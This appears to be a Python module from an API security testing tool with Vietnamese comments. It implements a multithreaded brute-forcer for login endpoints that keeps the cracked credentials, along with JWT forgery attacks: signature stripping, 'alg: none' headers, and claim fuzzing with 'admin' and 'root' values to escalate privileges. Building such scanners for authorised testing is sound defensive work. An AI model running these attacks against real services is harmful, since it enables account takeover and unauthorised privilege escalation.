import itertools
import concurrent.futures
import threading
import base64
import json
from tests.security.Bola_test import MyTester as BolaTester

# [FIX]: Xóa bỏ hoàn toàn url và open_api cứng ở đầu file để dùng self.base_url kế thừa

class MyTester(BolaTester):
    # ====== Phần này là phần Broken Auth =======
    wordlist_cache = None

    def wordlist_storage_cache(self):
        self.wordlist_cache = {
            "username": self.load_wordlist("wordlist/user.txt"),
            "password": self.load_wordlist("wordlist/password.txt"), 
            "id" : [1],
            "role" : ["admin"],   
            "grant": ["password"], 
            "client": [""],        
            "scope": [""]
        }

    def brute_force_map_wordlist(self, field_name, field_type, field_format):
        check = field_name.lower()
        if self.wordlist_cache is None:
            self.wordlist_storage_cache()

        for key, wordlist in self.wordlist_cache.items():
            if key in check:
                return wordlist
        
        type_and_format_check = {
            ("string", None) : self.wordlist_cache.get("username"),
            ("integer", None): [1],
            ("boolean", None): [True, False]
        }
        return type_and_format_check.get((field_type, field_format), ["None"])
    
    def all_in_one_wordlist(self, input_endpoint):
        list_of_all = {}
        # get_endpoint_map() đã dùng self.base_url bên trong SecurityFunction
        for endpoints, schema in self.get_endpoint_map().items():
            endpoint = endpoints.split()[0]
            if endpoint == input_endpoint:
                for schemas, property in self.get_component_map().items():
                    if schemas == schema:
                        for field_name, type_format in property.items():
                            f_type = type_format.get("type")
                            f_format = type_format.get("format")
                            list_of_all[field_name] = self.brute_force_map_wordlist(field_name, f_type, f_format)
        return list_of_all
                        
    def worker_threading(self, endpoint, payload, stop_event):
        if stop_event.is_set():
            return False
        
        try:
            # self.post_data tự động ghép self.base_url với endpoint
            shoot = self.post_data(endpoint, payload)
            if shoot.status_code == 200:
                token = shoot.json().get("access_token")
                if token:
                    stop_event.set()
                    return True
            else:
                shoot = self._xu_ly_yeu_cau("POST", endpoint, json=payload)
                if shoot.status_code == 200:
                    token = shoot.json().get("access_token")
                    if token:
                        stop_event.set()
                        return True
        except Exception as e:
            print(f"Lỗi Brute Force: {e}")
        return False

    def Brute_force(self):
        lo_hong = False
        cred = {}
        found = False
        tai_khoan_hack_duoc = None

        for endpoints, schema in self.get_endpoint_map().items():
            end = endpoints.split()[0]
            wordlists_all = self.all_in_one_wordlist(end)
            keys = list(wordlists_all.keys())

            if not (any("user" in k.lower() for k in keys) and any("pass" in k.lower() for k in keys)):
                continue
            
            wordlists = list(wordlists_all.values())
            combinations = list(itertools.product(*wordlists))
            
            stop_event = threading.Event()
            with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executors:
                future_all = []
                for combo in combinations:
                    payload = dict(zip(keys, combo))
                    future = executors.submit(self.worker_threading, end, payload, stop_event)
                    
                    # 🔥 MẸO Ở ĐÂY: Lưu thẳng payload vào cred thay vì combo để lấy ra luôn dạng dictionary (user: pass)
                    cred[future] = payload 
                    future_all.append(future)

                for future in concurrent.futures.as_completed(future_all):
                    # Khi luồng nào trả về True (nghĩa là worker_threading đã check 200 OK thành công)
                    if future.result() == True:
                        lo_hong = True
                        found = True
                        
                        # 🔥 BẾ CÁI TÀI KHOẢN VỪA HACK ĐƯỢC RA NGOÀI
                        tai_khoan_hack_duoc = cred[future]
                        
                        stop_event.set()
                        for f in future_all: f.cancel()
                        break
            if found: break
            
        # 🔥 TRẢ VỀ CẢ 2 GIÁ TRỊ: Trạng thái lỗi và Dữ liệu hack được
        return lo_hong, tai_khoan_hack_duoc

    def jwt_endpoint(self):
        endpoints = self.get_endpoint_map()
        components = self.get_component_map()
        endpoint_list_valid = []
        for end, schema in endpoints.items():
            if end.split()[1].lower() != "post": continue
            for schema_name, field_property in components.items():
                if schema == schema_name:
                    field_list = [f.lower() for f in field_property.keys()]
                    if any(x in field_list for x in ["user", "username"]) and any(y in field_list for y in ["pass", "password"]):
                        endpoint_list_valid.append(end.split()[0])
        return endpoint_list_valid

    def jwt_scan_field(self, token_json):
        jwt_blacklist = ["iat", "exp", "nbf", "iss", "jti", "aud"]
        fuzz_values = ["admin", "superuser", "root", "administrator", True, 1]
        payload_list = []
        for keys, values in token_json.items():
            if keys in jwt_blacklist: continue
            for val in fuzz_values:
                tmp_payload = token_json.copy()
                tmp_payload[keys] = val
                if tmp_payload not in payload_list: payload_list.append(tmp_payload)
        return payload_list

    def thread_worker(self, encoded_payload, payload_p1, target_endpoint, stop_bell):
        if stop_bell.is_set(): return False
        try:
            payload_last = f"{payload_p1}.{encoded_payload}."
            header_pay = {"Authorization": f"Bearer {payload_last}"}
            shoot = self._xu_ly_yeu_cau("GET", target_endpoint, headers=header_pay)
            if shoot.status_code == 200:
                print("✅ Thành công leo thang đặc quyền !!")
                return True
        except Exception: pass
        return False

    def thread_worker_nosig(self, encoded_payload, payload_p1, target_endpoint, stop_bell):
        if stop_bell.is_set(): return False
        try:
            payload_last = f"{payload_p1}.{encoded_payload}"
            header_pay = {"Authorization": f"Bearer {payload_last}"}
            shoot = self._xu_ly_yeu_cau("GET", target_endpoint, headers=header_pay)
            if shoot.status_code == 200:
                print("✅ Thành công leo thang đặc quyền !!")
                return True
        except Exception: pass
        return False

    def padding64(self, data):
        needed = len(data) % 4
        if needed != 0: data += "=" * (4 - needed)
        return data

    def jwt_manipulation_payload(self, user_and_pass, target_endpoint):
        all_login_endpoints = self.jwt_endpoint()
        lo_hong = False
        
        for login_endpoint in all_login_endpoints:
            take_token = self.post_data(login_endpoint, user_and_pass)
            if take_token.status_code == 200:
                token = take_token.json().get("access_token")
                if token:
                    part1, part2 = token.split(".")[0], token.split(".")[1]
                    dec_p2 = base64.urlsafe_b64decode(self.padding64(part2)).decode('utf-8')
                    payload_p2 = self.jwt_scan_field(json.loads(dec_p2))
                    stop_bell = threading.Event()

                    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executors:
                        all_future = []
                        for payload in payload_p2:
                            str_payload_p2 = json.dumps(payload)
                            enc_pay_p2 = base64.urlsafe_b64encode(str_payload_p2.encode('utf-8')).decode('utf-8').rstrip("=")
                            all_future.append(executors.submit(self.thread_worker_nosig, enc_pay_p2, part1, target_endpoint, stop_bell))

                        for fut in concurrent.futures.as_completed(all_future):
                            if fut.result():
                                lo_hong = True
                                stop_bell.set()
                                for fu in all_future: fu.cancel()
                                break      
        return lo_hong

    def jwt_none_algro(self, user_and_pass, target_endpoint):
        all_login_endpoints = self.jwt_endpoint()
        lo_hong = False
        for login_endpoint in all_login_endpoints:
            take_token = self.post_data(login_endpoint, user_and_pass)
            if take_token.status_code == 200:
                token = take_token.json().get("access_token")
                if token:
                    part1, part2 = token.split(".")[0], token.split(".")[1]
                    dec_p1 = base64.urlsafe_b64decode(self.padding64(part1)).decode('utf-8')
                    dec_p2 = base64.urlsafe_b64decode(self.padding64(part2)).decode('utf-8')
                    list_payloads = self.jwt_scan_field(json.loads(dec_p2))
                    stop_bell = threading.Event()

                    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executors:
                        none_alg = ["none", "None", "NONE"]
                        all_future = []
                        for payloads in list_payloads:
                            for alg in none_alg:
                                tmp_p1 = json.loads(dec_p1)
                                tmp_p1["alg"] = alg
                                payload_p1 = base64.urlsafe_b64encode(json.dumps(tmp_p1).encode('utf-8')).decode('utf-8').rstrip("=")
                                encoded_p2 = base64.urlsafe_b64encode(json.dumps(payloads).encode('utf-8')).decode('utf-8').rstrip("=")
                                all_future.append(executors.submit(self.thread_worker, encoded_p2, payload_p1, target_endpoint, stop_bell))
                        
                        for future in concurrent.futures.as_completed(all_future):
                            if future.result():
                                lo_hong = True
                                stop_bell.set()
                                for f in all_future: f.cancel()
                                break
        return lo_hong

# [FIX]: Xóa toàn bộ các hàm test lẻ và dòng tool = MyTester(url) ở cuối file 
# vì Pytest sẽ gọi thông qua tool.py